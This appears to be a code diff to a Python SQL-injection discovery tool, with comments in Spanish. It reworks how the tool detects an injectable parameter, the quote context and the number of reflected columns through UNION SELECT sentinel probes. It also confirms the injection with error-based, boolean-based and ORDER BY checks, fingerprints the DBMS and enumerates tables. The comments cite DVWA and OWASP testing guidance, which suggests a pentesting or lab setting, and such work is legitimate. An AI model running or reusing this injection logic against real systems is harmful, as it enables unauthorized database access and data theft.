@@ -92,41 +92,31 @@ class SchemaDiscovery:
         res = DiscoveryResult()
         baseline = self.probe("1")  # respuesta normal (sin inyección), para el test diferencial
 
-        # 1. Confirmar inyección + nº de columnas, probando contexto de cadena y luego entero.
+        # 1. Contexto de comillas + nº de columnas + columnas reflejadas, por BÚSQUEDA UNION.
+        #    Robusto: funciona aunque el objetivo NO muestre errores SQL (p. ej. DVWA high, que
+        #    ante una consulta inválida simplemente no devuelve filas en vez de mostrar el error).
         for quote in ("'", ""):
-            first = self.probe(f"1{quote} ORDER BY 1-- -")
-            if first.blocked or first.db_error:
-                continue
-            cols = _MAX_COLUMNS
-            for n in range(2, _MAX_COLUMNS + 1):
-                r = self.probe(f"1{quote} ORDER BY {n}-- -")
-                if r.blocked or r.db_error:
-                    cols = n - 1
+            for n in range(1, _MAX_COLUMNS + 1):
+                sents = [str(1000 + i) for i in range(n)]
+                r = self.probe(f"-1{quote} UNION SELECT {','.join(sents)}-- -")
+                flat = {c for row in r.cells for c in row}
+                hit = [i for i, s in enumerate(sents, start=1) if s in flat]
+                if hit:
+                    res.injectable, res.quote, res.columns, res.reflected = True, quote, n, hit
                     break
-            if cols >= 1:
-                res.injectable, res.quote, res.columns = True, quote, cols
+            if res.injectable:
                 break
-        self._log(res, f"inyectable={res.injectable} comillas={res.quote!r} columnas={res.columns} (ORDER BY)")
+        self._log(res, f"inyectable={res.injectable} comillas={res.quote!r} "
+                       f"columnas={res.columns} reflejadas={res.reflected} (UNION)")
         if not res.injectable:
             return res
+        res.techniques.append("union-based")
         q = res.quote
 
         # 2. VERIFICAR la inyección con técnicas independientes (OWASP WSTG-INPV-05).
         self._confirm_injection(res, q, baseline)
 
-        # 3. Qué columnas se reflejan (y de paso valida el nº de columnas por UNION).
-        sentinels = [str(1000 + i) for i in range(res.columns)]
-        r = self.probe(f"-1{q} UNION SELECT {','.join(sentinels)}-- -")
-        flat = {c for row in r.cells for c in row}
-        res.reflected = [i for i, s in enumerate(sentinels, start=1) if s in flat]
-        if res.reflected:
-            res.techniques.append("union-based")
-            self._log(res, f"columnas reflejadas={res.reflected} (nº de columnas validado por UNION)")
-        else:
-            self._log(res, "sin columnas reflejadas: no se puede continuar por UNION")
-            return res
-
-        # 4. Fingerprint del DBMS antes de usar sintaxis específica de MySQL.
+        # 3. Fingerprint del DBMS antes de usar sintaxis específica de MySQL.
         self._fingerprint(res)
 
         # 5. Enumerar las tablas de la base de datos actual.
@@ -146,15 +136,17 @@ class SchemaDiscovery:
         return res
 
     def _confirm_injection(self, res: DiscoveryResult, q: str, baseline: ProbeResult) -> None:
-        """Confirma la inyección por vías independientes y registra la evidencia."""
+        """Confirma la inyección por vías independientes y registra la evidencia (OWASP WSTG)."""
         if self.probe(f"1{q}").db_error:
             res.techniques.append("error-based")
         true_r = self.probe(f"1{q} AND 1=1-- -")
         false_r = self.probe(f"1{q} AND 1=2-- -")
         if true_r.cells and not false_r.cells:
             res.techniques.append("boolean-based")
-        confirmed = res.techniques or ["order-by"]
-        self._log(res, f"inyección confirmada por: {confirmed}")
+        # cross-check del nº de columnas con ORDER BY (solo si el objetivo muestra errores)
+        if self.probe(f"1{q} ORDER BY {res.columns + 1}-- -").db_error:
+            res.trace.append(f"nº de columnas {res.columns} validado por ORDER BY")
+        self._log(res, f"inyección confirmada por: {res.techniques}")
 
     def _fingerprint(self, res: DiscoveryResult) -> None:
         """Detecta el motor de base de datos con @@version."""
